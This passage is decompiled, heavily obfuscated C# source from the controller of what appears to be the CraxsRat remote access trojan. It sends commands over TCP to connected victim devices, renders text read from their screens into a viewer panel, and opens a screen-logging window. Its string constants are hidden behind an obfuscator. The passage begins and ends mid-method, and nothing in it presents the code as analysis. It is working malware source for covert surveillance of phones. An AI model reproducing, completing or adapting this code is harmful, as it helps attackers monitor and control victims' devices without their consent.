label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel Panel1
    {
      get => ((ScreenShoter) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenShoter) this)._Panel1 = value;
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
    {
      get => ((ScreenShoter) this)._DrakeUIButtonIcon1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click_1);
label_1:
        int num1 = -308969730;
        DrakeUIButtonIcon drakeUiButtonIcon1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-(-num1 * -631873613) ^ ~482816337 ^ 1768017554 ^ 1670083177) - (-1063875491 ^ -995332036) ^ 1437051631)) % 8U)
          {
            case 0:
              drakeUiButtonIcon1.Click -= eventHandler;
              num1 = (int) num2 * -737656556 ^ 1837405329;
              continue;
            case 1:
              drakeUiButtonIcon1 = ((ScreenShoter) this)._DrakeUIButtonIcon1;
              num1 = (int) num2 * -1833756981 ^ 14954907;
              continue;
            case 2:
              ((ScreenShoter) this)._DrakeUIButtonIcon1 = value;
              drakeUiButtonIcon1 = ((ScreenShoter) this)._DrakeUIButtonIcon1;
              num1 = -773717438;
              continue;
            case 3:
              int num3 = drakeUiButtonIcon1 == null ? -556119516 : (num3 = 536295938);
              num1 = num3 ^ (int) num2 * 489028703;
              continue;
            case 4:
              drakeUiButtonIcon1.Click += eventHandler;
              num1 = (int) num2 * -1803540738 ^ -401431916;
              continue;
            case 5:
              int num4 = drakeUiButtonIcon1 == null ? 944915337 : (num4 = 738563430);
              num1 = num4 ^ (int) num2 * 1521612041;
              continue;
            case 6:
              goto label_1;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
    {
      get => ((ScreenShoter) this)._DrakeUIButtonIcon3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon3_Click);
        DrakeUIButtonIcon drakeUiButtonIcon3 = ((ScreenShoter) this)._DrakeUIButtonIcon3;
label_1:
        int num1 = 835293359;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(~num1 ^ 661482817 * (-1520687415 - -519796928) + -(1263876797 - -1376787814) + -(-745991031 ^ 292009488 ^ -2137995955 * 1891257609))) % 8U)
          {
            case 0:
              int num3 = drakeUiButtonIcon3 == null ? -396959167 : (num3 = -116865526);
              num1 = num3 ^ (int) num2 * 1294274526;
              continue;
            case 1:
              drakeUiButtonIcon3.Click += eventHandler;
              num1 = (int) num2 * 1656070809 ^ -1014327800;
              continue;
            case 2:
              goto label_1;
            case 3:
              ((ScreenShoter) this)._DrakeUIButtonIcon3 = value;
              num1 = 896934588;
              continue;
            case 4:
              goto label_3;
            case 5:
              drakeUiButtonIcon3.Click -= eventHandler;
              num1 = (int) num2 * -1938107991 ^ -2050209067;
              continue;
            case 6:
              int num4 = drakeUiButtonIcon3 == null ? -90417318 : (num4 = -1053122932);
              num1 = num4 ^ (int) num2 * -1008387345;
              continue;
            case 7:
              drakeUiButtonIcon3 = ((ScreenShoter) this)._DrakeUIButtonIcon3;
              num1 = (int) num2 * -1317423331 ^ -1102172450;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
    {
      get => ((ScreenShoter) this)._DrakeUIButtonIcon4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon4_Click);
label_1:
        int num1 = -464288890;
        DrakeUIButtonIcon drakeUiButtonIcon4;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(~--num1 - ~(1916299685 ^ 156554905))) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              drakeUiButtonIcon4 = ((ScreenShoter) this)._DrakeUIButtonIcon4;
              int num3 = drakeUiButtonIcon4 == null ? -261038407 : (num3 = -261850476);
              num1 = num3 ^ (int) num2 * -880576181;
              continue;
            case 2:
              drakeUiButtonIcon4.Click -= eventHandler;
              num1 = (int) num2 * -1592979558 ^ -1938406594;
              continue;
            case 3:
              drakeUiButtonIcon4.Click += eventHandler;
              num1 = (int) num2 * -881405419 ^ 339640930;
              continue;
            case 4:
              int num4 = drakeUiButtonIcon4 == null ? -542743987 : (num4 = 1473106928);
              num1 = num4 ^ (int) num2 * 1899474696;
              continue;
            case 5:
              ((ScreenShoter) this)._DrakeUIButtonIcon4 = value;
              num1 = -736861364;
              continue;
            case 6:
              goto label_1;
            case 7:
              drakeUiButtonIcon4 = ((ScreenShoter) this)._DrakeUIButtonIcon4;
              num1 = (int) num2 * 1413528903 ^ -98119352;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsaxrftyu(object sender, EventArgs e)
    {
      if (((ScreenShoter) this).Classclient == null)
        return;
      try
      {
        if (((ScreenShoter) this).LogScreen == null)
        {
label_2:
          int num1 = 1415588369;
          while (true)
          {
            int num2 = num1;
            uint num3;
            switch ((num3 = (uint) ((1832211356 - (-~(1029363243 + 2132087286) * -2056302809 - (num2 - -(-365433481 * ~911333042 + (-1288435623 ^ 983293988 ^ 740302202 - 682393622) ^ --~-150668424)))) * -1991016101)) % 4U)
            {
              case 1:
                ((ScreenShoter) this).LogScreen.Show((IWin32Window) this);
                num1 = (int) num3 * 829869103 ^ -1261922420;
                continue;
              case 2:
                ((ScreenShoter) this).LogScreen = new ScreenLoger();
                num1 = (int) num3 * -1538160560 ^ -1424523134;
                continue;
              case 3:
                goto label_2;
              default:
                goto label_9;
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_9:
      // ISSUE: reference to a compiler-generated field
      TcpClient client = ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient;
label_10:
      int num4 = -1323952075;
      while (true)
      {
        int num5 = num4;
        uint num6;
        switch ((num6 = (uint) ((1832211356 - (-~(1029363243 + 2132087286) * -2056302809 - (num5 - -(-365433481 * ~911333042 + (-1288435623 ^ 983293988 ^ 740302202 - 682393622) ^ --~-150668424)))) * -1991016101)) % 5U)
        {
          case 0:
            this.disablebtn.Enabled = true;
            num4 = (int) num6 * -265208663 ^ -562595487;
            continue;
          case 1:
            string[] strArray = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((ScreenShoter) this).Classclient.SendMessage(new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003696B5341 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00342183B69),
              (object) ((ScreenShoter) this).Classclient
            });
            num4 = (int) num6 * 236502396 ^ 194919843;
            continue;
          case 2:
            this.Timer1.Enabled = true;
            this.enablebtn.Enabled = false;
            num4 = (int) num6 * -1827570000 ^ 1645006062;
            continue;
          case 3:
            goto label_7;
          case 4:
            goto label_10;
          default:
            goto label_4;
        }
      }
label_7:
      return;
label_4:;
    }

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
      if (((ScreenShoter) this).Classclient == null)
        return;
label_1:
      int num1 = 1340164556;
      TcpClient client;
      string[] strArray;
      object[] ParametersObjects;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -((num1 - -879222693 * (-(421085260 ^ 1219604567 * 1716835035) - ~(--1194173512 ^ --373980634))) * 1239328469)) % 5U)
        {
          case 0:
            ((ScreenShoter) this).Classclient.SendMessage(ParametersObjects);
            this.enablebtn.Enabled = true;
            this.disablebtn.Enabled = false;
            num1 = (int) num2 * 1703483223 ^ 635495599;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient;
            strArray = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * 1450162409 ^ -1095097684;
            continue;
          case 2:
            goto label_1;
          case 3:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00368474B6E + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003565A5875),
              (object) ((ScreenShoter) this).Classclient
            };
            num1 = (int) num2 * -1336203946 ^ -1998802684;
            continue;
          case 4:
            goto label_7;
          default:
            goto label_8;
        }
      }
label_7:
      return;
label_8:;
    }

    public void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxczxsdkh(object[] objs)
    {
      try
      {
        if (!this.viewpanel.InvokeRequired)
          goto label_13;
label_1:
        int num1 = 1311900525;
label_2:
        string Left;
        while (true)
        {
          uint num2;
          // ISSUE: variable of a compiler-generated type
          ScreenReader._Closure\u0024__52\u002D0 closure520;
          string[] strArray1;
          string[] strArray2;
          string[] strArray3;
          int index;
          string str;
          int num3;
          switch ((num2 = (uint) (~((num1 ^ (~1248672047 ^ -686597714 * 942484709) + (-59756932 - 1982541741 - (-1803997944 ^ 1150015159)) - 579835907 ^ ~~~(-2040651485 - 1112454659) ^ (916668335 - 358017233 - (-341022927 - 1405284031) ^ 674573743 - 1063731624) * -725444921) * -2118226457 + -(-67102246 ^ 1161271697)) + 365308840)) % 15U)
          {
            case 0:
              ((ScreenShoter) this).LogScreen.Logs.AppendText(EXGuarder.\u00370556960 + str + EXGuarder.\u00346020862);
              num1 = (int) num2 * -212550464 ^ 2096627309;
              continue;
            case 1:
              // ISSUE: method pointer
              this.viewpanel.Invoke((Delegate) new ScreenReader((object) this, __methodptr(CraxsRatkfvuiorkenfudpajrsnCraxsRatsxczxsdkh)), (object) objs);
              num1 = (int) num2 * -488320437 ^ 852920543;
              continue;
            case 3:
              str = strArray1[0];
              num1 = (int) num2 * 978957873 ^ -524112045;
              continue;
            case 4:
label_9:
              if (index <= num3)
              {
                num1 = 2067517610;
                continue;
              }
              goto label_59;
            case 5:
              if (!(string.IsNullOrEmpty(str) | string.IsNullOrWhiteSpace(str)))
              {
                num1 = (int) num2 * -627997125 ^ -1381809160;
                continue;
              }
              break;
            case 6:
              goto label_13;
            case 7:
              goto label_63;
            case 8:
              goto label_5;
            case 9:
              int num4 = Operators.CompareString(Left, EXGuarder.\u0035E2A0E65, false) != 0 ? 605219138 : (num4 = -2028202419);
              num1 = num4 ^ (int) num2 * -983322767;
              continue;
            case 10:
              goto label_1;
            case 11:
              strArray3 = Left.Split('^');
              num1 = 385723845;
              continue;
            case 12:
              num3 = checked (strArray3.Length - 1);
              index = 0;
              num1 = (int) num2 * 1742501324 ^ -2007327666;
              continue;
            case 13:
              closure520 = (ScreenReader._Closure\u0024__52\u002D0) new ScreenReader.addLogback(closure520);
              ((ScreenShoter) closure520).\u0024VB\u0024Me = this;
              strArray1 = strArray3[index].Split(':');
              ((ScreenShoter) closure520).\u0024VB\u0024Local_Type = new TextBox();
              num1 = (int) num2 * 2095627683 ^ 2013758216;
              continue;
            case 14:
              ((ScreenShoter) closure520).\u0024VB\u0024Local_sizearry = strArray1[1].Split('~');
              strArray2 = strArray1[2].Split('~');
              num1 = (int) num2 * -1842340294 ^ -2094258798;
              continue;
            default:
              string[] strArray4 = (string[]) null;
              try
              {
                strArray4 = strArray1[3].Split('~');
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
label_20:
                int num5 = -1955832852;
                while (true)
                {
                  uint num6;
                  switch ((num6 = (uint) (~((num5 ^ (~1248672047 ^ -686597714 * 942484709) + (-59756932 - 1982541741 - (-1803997944 ^ 1150015159)) - 579835907 ^ ~~~(-2040651485 - 1112454659) ^ (916668335 - 358017233 - (-341022927 - 1405284031) ^ 674573743 - 1063731624) * -725444921) * -2118226457 + -(-67102246 ^ 1161271697)) + 365308840)) % 4U)
                  {
                    case 0:
                      goto label_20;
                    case 2:
                      ProjectData.ClearProjectError();
                      num5 = (int) num6 * -610658340 ^ 1126909310;
                      continue;
                    case 3:
                      strArray4 = (string[]) null;
                      num5 = (int) num6 * 1513375770 ^ -1410388441;
                      continue;
                    default:
                      goto label_55;
                  }
                }
              }
label_55:
              int integer1 = Conversions.ToInteger(strArray2[0]);
              int integer2 = Conversions.ToInteger(strArray2[1]);
              if (((ScreenShoter) this).ScreenSize == new Size())
                goto label_56;
label_25:
              ((ScreenShoter) closure520).\u0024VB\u0024Local_Type.Location = new Point(checked ((int) Math.Round(unchecked (Conversions.ToDouble(((ScreenShoter) closure520).\u0024VB\u0024Local_sizearry[0]) * (double) this.viewpanel.Width / (double) integer1))), checked ((int) Math.Round(unchecked (Conversions.ToDouble(((ScreenShoter) closure520).\u0024VB\u0024Local_sizearry[1]) * (double) this.viewpanel.Height / (double) integer2))));
              IEnumerator enumerator;
              try
              {
                enumerator = this.viewpanel.Controls.GetEnumerator();
label_27:
                uint num7;
                switch ((num7 = (uint) (~((718261570 ^ (~1248672047 ^ -686597714 * 942484709) + (-59756932 - 1982541741 - (-1803997944 ^ 1150015159)) - 579835907 ^ ~~~(-2040651485 - 1112454659) ^ (916668335 - 358017233 - (-341022927 - 1405284031) ^ 674573743 - 1063731624) * -725444921) * -2118226457 + -(-67102246 ^ 1161271697)) + 365308840)) % 3U)
                {
                  case 0:
                    goto label_27;
                  case 1:
label_35:
                    if (enumerator.MoveNext())
                      goto default;
                    else
                      break;
                  default:
                    Control current = (Control) enumerator.Current;
                    try
                    {
                      if (((ScreenShoter) closure520).\u0024VB\u0024Local_Type.Bounds.IntersectsWith(current.Bounds))
                      {
label_30:
                        int num8 = 1924546782;
                        while (true)
                        {
                          uint num9;
                          switch ((num9 = (uint) (~((num8 ^ (~1248672047 ^ -686597714 * 942484709) + (-59756932 - 1982541741 - (-1803997944 ^ 1150015159)) - 579835907 ^ ~~~(-2040651485 - 1112454659) ^ (916668335 - 358017233 - (-341022927 - 1405284031) ^ 674573743 - 1063731624) * -725444921) * -2118226457 + -(-67102246 ^ 1161271697)) + 365308840)) % 4U)
                          {
                            case 0:
                              this.viewpanel.Controls.Remove(current);
                              num8 = (int) num9 * -1343004353 ^ 691319097;
                              continue;
                            case 1:
                              int num10 = !((ScreenShoter) closure520).\u0024VB\u0024Local_Type.Text.Equals(current.Text, StringComparison.CurrentCultureIgnoreCase) ? 225829706 : (num10 = 1847920924);
                              num8 = num10 ^ (int) num9 * 1387054527;
                              continue;
                            case 3:
                              goto label_30;
                            default:
                              goto label_35;
                          }
                        }
                      }
                      else
                        goto case 1;
                    }
                    catch (Exception ex)
                    {
                      ProjectData.SetProjectError(ex);
                      ProjectData.ClearProjectError();
                      goto case 1;
                    }
                }
              }
              finally
              {
                if (enumerator is IDisposable)
                {
label_38:
                  int num11 = -1232661725;
                  while (true)
                  {
                    uint num12;
                    switch ((num12 = (uint) (~((num11 ^ (~1248672047 ^ -686597714 * 942484709) + (-59756932 - 1982541741 - (-1803997944 ^ 1150015159)) - 579835907 ^ ~~~(-2040651485 - 1112454659) ^ (916668335 - 358017233 - (-341022927 - 1405284031) ^ 674573743 - 1063731624) * -725444921) * -2118226457 + -(-67102246 ^ 1161271697)) + 365308840)) % 3U)
                    {
                      case 0:
                        goto label_38;
                      case 1:
                        (enumerator as IDisposable).Dispose();
                        num11 = (int) num12 * -675303223 ^ 536854959;
                        continue;
                      default:
                        goto label_42;
                    }
                  }
                }
label_42:;
              }
              ((ScreenShoter) closure520).\u0024VB\u0024Local_Type.Text = str;
              if (strArray4 != null)
                goto label_58;
label_44:
              int num13 = -1857614615;
label_45:
              while (true)
              {
                uint num14;
                switch ((num14 = (uint) (~((num13 ^ (~1248672047 ^ -686597714 * 942484709) + (-59756932 - 1982541741 - (-1803997944 ^ 1150015159)) - 579835907 ^ ~~~(-2040651485 - 1112454659) ^ (916668335 - 358017233 - (-341022927 - 1405284031) ^ 674573743 - 1063731624) * -725444921) * -2118226457 + -(-67102246 ^ 1161271697)) + 365308840)) % 13U)
                {
                  case 0:
                    ((ScreenShoter) closure520).\u0024VB\u0024Local_Type.DoubleClick += new EventHandler(((ScreenReader.addLogback) closure520)._Lambda\u0024__0);
                    num13 = (int) num14 * 1041249625 ^ -1851698590;
                    continue;
                  case 1:
                    num13 = (int) num14 * 1625176556 ^ -1296068795;
                    continue;
                  case 2:
                    ((ScreenShoter) closure520).\u0024VB\u0024Local_Type.BorderStyle = BorderStyle.FixedSingle;
                    num13 = (int) num14 * -1041309418 ^ 947690343;
                    continue;
                  case 3:
                    goto label_24;
                  case 4:
                    goto label_55;
                  case 5:
                    ((ScreenShoter) closure520).\u0024VB\u0024Local_Type.ForeColor = Color.White;
                    ((ScreenShoter) closure520).\u0024VB\u0024Local_Type.ReadOnly = true;
                    num13 = (int) num14 * -802558986 ^ 1414284536;
                    continue;
                  case 6:
                    goto label_51;
                  case 7:
                    goto label_58;
                  case 8:
                    Size size = TextRenderer.MeasureText(((ScreenShoter) closure520).\u0024VB\u0024Local_Type.Text, ((ScreenShoter) closure520).\u0024VB\u0024Local_Type.Font);
                    ((ScreenShoter) closure520).\u0024VB\u0024Local_Type.Size = new Size(size.Width, 20);
                    num13 = (int) num14 * -628572404 ^ -1978673322;
                    continue;
                  case 9:
                    // ISSUE: reference to a compiler-generated method
                    ((ScreenShoter) closure520).\u0024VB\u0024Local_Type.MouseClick += new MouseEventHandler(closure520._Lambda\u0024__1);
                    this.viewpanel.Controls.Add((Control) ((ScreenShoter) closure520).\u0024VB\u0024Local_Type);
                    num13 = (int) num14 * -1212343518 ^ 74336367;
                    continue;
                  case 10:
                    goto label_49;
                  case 11:
                    goto label_44;
                  case 12:
                    ((ScreenShoter) closure520).\u0024VB\u0024Local_Type.BorderStyle = BorderStyle.None;
                    ((ScreenShoter) closure520).\u0024VB\u0024Local_Type.BackColor = Color.Black;
                    num13 = -1500176220;
                    continue;
                  default:
                    goto label_46;
                }
              }
label_24:
              ((ScreenShoter) this).ScreenSize = new Size(Conversions.ToInteger(strArray2[0]), Conversions.ToInteger(strArray2[1]));
              goto label_25;
label_56:
              num13 = 249325336;
              goto label_45;
label_58:
              Size size1 = TextRenderer.MeasureText(((ScreenShoter) closure520).\u0024VB\u0024Local_Type.Text, ((ScreenShoter) closure520).\u0024VB\u0024Local_Type.Font);
              ((ScreenShoter) closure520).\u0024VB\u0024Local_Type.Size = new Size(size1.Width, Conversions.ToInteger(strArray4[1]));
              num13 = 732634825;
              goto label_45;
          }
label_51:
          checked { ++index; }
          goto label_9;
        }
label_63:
        return;
label_5:
        this.viewpanel.Controls.Clear();
        return;
label_59:
        return;
label_49:
        return;
label_46:
        return;
label_13:
        Left = Conversions.ToString(objs[0]);
        num1 = 1212917031;
        goto label_2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_61:
        int num15 = -2123081542;
        while (true)
        {
          uint num16;
          switch ((num16 = (uint) (~((num15 ^ (~1248672047 ^ -686597714 * 942484709) + (-59756932 - 1982541741 - (-1803997944 ^ 1150015159)) - 579835907 ^ ~~~(-2040651485 - 1112454659) ^ (916668335 - 358017233 - (-341022927 - 1405284031) ^ 674573743 - 1063731624) * -725444921) * -2118226457 + -(-67102246 ^ 1161271697)) + 365308840)) % 3U)
          {
            case 0:
              goto label_40;
            case 1:
              ProjectData.ClearProjectError();
              num15 = (int) num16 * 1142577839 ^ 1108173553;
              continue;
            case 2:
              goto label_61;
            default:
              goto label_36;
          }
        }
label_40:
        return;
label_36:;
      }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsijygesq(object sender, EventArgs e)
    {
      this.Timer1.Enabled = true;
      this.Timer1.Start();
    }

    private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
    {
      try
      {
        this.viewpanel.Controls.Clear();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      if (this.viewpanel.Controls.Count <= 0)
        return;
label_1:
      int num1 = -1229493927;
      int num2;
      int index;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) ~~(-~~num1 * 1049256357)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            index = 0;
            num1 = (int) num3 * 1374710875 ^ -1011891551;
            continue;
          case 3:
            num2 = checked (this.viewpanel.Controls.Count - 1);
            num1 = (int) num3 * 1101844198 ^ 710386452;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      while (index <= num2)
      {
        try
        {
          if (this.viewpanel.Controls[index].Tag != null)
          {
label_7:
            int num4 = 1212899315;
            while (true)
            {
              uint num5;
              switch ((num5 = (uint) ~~(-~~num4 * 1049256357)) % 4U)
              {
                case 0:
                  goto label_7;
                case 1:
                  int num6 = !Operators.ConditionalCompareObjectEqual(this.viewpanel.Controls[index].Tag, (object) EXGuarder.\u00369584053, false) ? 560626078 : (num6 = -1206292259);
                  num4 = num6 ^ (int) num5 * -539396068;
                  continue;
                case 3:
                  this.viewpanel.Controls.Remove(this.viewpanel.Controls[index]);
                  num4 = (int) num5 * 1174129507 ^ 504948595;
                  continue;
                default:
                  goto label_17;
              }
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
label_12:
          int num7 = -651983577;
          while (true)
          {
            uint num8;
            switch ((num8 = (uint) ~~(-~~num7 * 1049256357)) % 3U)
            {
              case 0:
                goto label_12;
              case 1:
                ProjectData.ClearProjectError();
                num7 = (int) num8 * 436696286 ^ -1476152970;
                continue;
              default:
                goto label_17;
            }
          }
        }
label_17:
        checked { ++index; }
      }
    }

    private void ScreenReader_FormClosing(object sender, FormClosingEventArgs e)
    {
      if (((ScreenShoter) this).Classclient == null)
        goto label_5;
label_1:
      int num1 = 583691932;
label_2:
      object[] ParametersObjects;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~(num1 * 1950639053) * 1446545355 - (1766248259 * 1315101027 ^ 1016710183 * 1333959954)) * -622643977 - 363026932)) % 5U)
        {
          case 1:
            // ISSUE: reference to a compiler-generated field
            TcpClient client = ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient;
            string[] strArray = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003115A7201 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00325746B11),
              (object) ((ScreenShoter) this).Classclient
            };
            num1 = (int) num2 * 1800822831 ^ -1903103137;
            continue;
          case 2:
            goto label_5;
          case 3:
            ((ScreenShoter) this).Classclient.SendMessage(ParametersObjects);
            num1 = (int) num2 * -934922315 ^ -1309107693;
            continue;
          case 4:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_6:
      this.Timer1.Enabled = false;
      return;
label_5:
      this.Timer1.Stop();
      num1 = -1005164210;
      goto label_2;
    }

    private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
    {
      if (((ScreenShoter) this).Classclient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
label_2:
        int num1 = 1087365281;
        object[] ParametersObjects;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 ^ -(--2007985726 * 162712623) - ~((-1534923921 ^ 2100909870) + (1581336338 ^ -1694422669)) ^ 543659883 * (1461753409 - 1287575571) - ~(-1834275850 - 246049582) + (-(574691264 * -900398023) - -(123743477 ^ -21083349))) + (601944417 * (--226028153 * -1910858589) ^ 606659246 - 2115421407 - (2010736396 - 236947014) ^ -1199997793 * (629150305 * 228101231)) ^ ~1814481753)) % 4U)
          {
            case 0:
              goto label_2;
            case 1:
              goto label_8;
            case 2:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ParametersObjects = new object[4]
              {
                (object) ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003223F065C + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u003773E5C27),
                (object) ((ScreenShoter) this).Classclient
              };
              num1 = (int) num2 * -322857288 ^ -1613926138;
              continue;
            case 3:
              ((ScreenShoter) this).Classclient.SendMessage(ParametersObjects);
              num1 = (int) num2 * -1250134523 ^ 1976609131;
              continue;
            default:
              goto label_9;
          }
        }
label_8:
        return;
label_9:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
    {
      if (((ScreenShoter) this).Classclient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        ((ScreenShoter) this).Classclient.SendMessage(new object[4]
        {
          (object) ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient,
